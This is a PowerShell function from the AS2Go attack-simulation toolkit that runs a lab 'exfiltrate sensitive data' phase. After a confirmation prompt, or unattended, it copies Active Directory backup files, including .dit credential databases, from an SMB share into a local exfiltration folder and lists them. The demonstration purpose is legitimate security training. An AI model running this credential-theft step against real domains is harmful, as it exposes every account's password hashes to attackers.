<#
.SYNOPSIS
Runs Phase 11 of the AS2Go attack simulation: Exfiltrate Sensitive Data.

.DESCRIPTION
Invoke-ASPhase11ExfiltrateSensitiveData executes the data exfiltration phase in the AS2Go workflow.
It prepares the phase context, updates the window and stage state, optionally displays the phase
visuals, and runs the Phase 11 steps after interactive confirmation (or automatically in
unattended mode).

The phase copies files from the configured AD backup share into the local exfiltration folder over SMB.
It creates the destination folder if needed and lists copied .dit files without copying subdirectories.
The lab uses simulated backup data to demonstrate how accessible backups can be exfiltrated.

.PARAMETER Preview
Browses descriptions and workflow steps offline without executing actions.
Uses a separate preview menu; runtime selection and skip parameters are not evaluated.

.PARAMETER UnAttended
Runs the phase without interactive confirmation prompts.

.PARAMETER Continue
Reserved switch for workflow continuation handling.

.PARAMETER EnableLogging
Enables extended logging for this phase execution.

.PARAMETER SkipImages
Skips visual phase assets (for example, phase HTML images/pages).

.PARAMETER SkipClearHost
Prevents clearing the console during phase execution.

.PARAMETER AS2GoDemo
Runs the phase in AS2Go demo mode and skips selected setup interactions.

.EXAMPLE
Invoke-ASPhase11ExfiltrateSensitiveData

Runs Phase 11 interactively.

.EXAMPLE
Invoke-ASPhase11ExfiltrateSensitiveData -UnAttended -EnableLogging

Runs Phase 11 without prompts and with logging enabled.

.EXAMPLE
Invoke-ASPhase11ExfiltrateSensitiveData -SkipImages -SkipClearHost

Runs Phase 11 without phase visuals and without clearing the host.

.NOTES
Part of: AS2Go attack phase orchestration

.COMPONENT
Category: Main Function

.FUNCTIONALITY
Demonstrates how accessible AD backups can be exfiltrated over SMB using simulated backup data.
Copies files from the configured backup share to a local folder and lists the copied .dit files.
#>
function Invoke-ASPhase11ExfiltrateSensitiveData {

    ################################################################################
    #####                                                                      #####
    #####    Run the Attack Phase - Exfiltrate Sensitive Data                  #####
    #####                                                                      #####
    ################################################################################
    [Alias("ASP11")]
    Param (
        [switch]$Preview,
        [switch]$UnAttended,
        [switch]$Continue,
        [Switch]$EnableLogging,
        [switch]$SkipImages,
        [switch]$SkipClearHost,
        [switch]$AS2GoDemo
    )
    if ($Preview) {
        Show-AS2GoPreview -FunctionName 'Invoke-ASPhase11ExfiltrateSensitiveData' -UnAttended:([bool]$PSBoundParameters['UnAttended'])
        return
    }


    $Info = Measure-FunctionRuntime -Begin
    Show-CurrentPhase -Phase "phase_11.html"

    If (-not $SkipClearHost) { Clear-Host }
    If (-not $AS2GoDemo) {
        Set-NewColorSchema -NewStage $Script:InitialStart
        Get-AS2GoSettings
    }
    Update-WindowTitle -NewTitle $Script:Phase11
    Set-ASConfig -Setting "LastStage" -Value $Script:Phase11


    If (-not $SkipClearHost) { Clear-Host }
    Write-AS2GoOutput -Type Header -Message "Attack Phase - $($Script:Phase11.toupper())"
    Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)
    Write-AS2GoOutput -Type  Bullet "Copy simulated AD backup files over SMB and list the local .dit files"

    If ($UnAttended) {
        $answer = $Script:Yes
    }
    else {
        $answer = Show-DecisionPrompt
    }

    If ($answer -eq $Script:Yes) {
        Write-AS2GoOutput -Type Header -Message "Data exfiltration over SMB Share"

        if (-not (Test-Path $Script:DefautExfiltrationFolder)) {
            New-Item $Script:DefautExfiltrationFolder -ItemType directory -ErrorAction Ignore | Out-Null
        }

        Write-Host ""
        Write-Host      -NoNewline "  Command: "
        Write-Highlight -Text "Copy-Item ", "-Path ", "$Script:ASBackupShare\*.* ", " -Destination ", "$Script:DefautExfiltrationFolder" `
            -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV

        If ($UnAttended) { Start-Sleep 2 } else { Pause }
        Copy-Item -Path $Script:ASBackupShare\*.* -Destination $Script:DefautExfiltrationFolder

        Write-Host ""
        Write-Host      -NoNewline "  Command: "
        Write-Highlight -Text "Get-Item ", "-Path ", "$Script:DefautExfiltrationFolder\*.dit" `
            -Color $fgcC, $fgcS, $fgcV
        Write-Host ""

        Get-Item -Path "$Script:DefautExfiltrationFolder\*.dit" | Out-Host
        If ($UnAttended) { Start-Sleep 2 } else { Pause }
    }

    Measure-FunctionRuntime -End -Details $Info
}
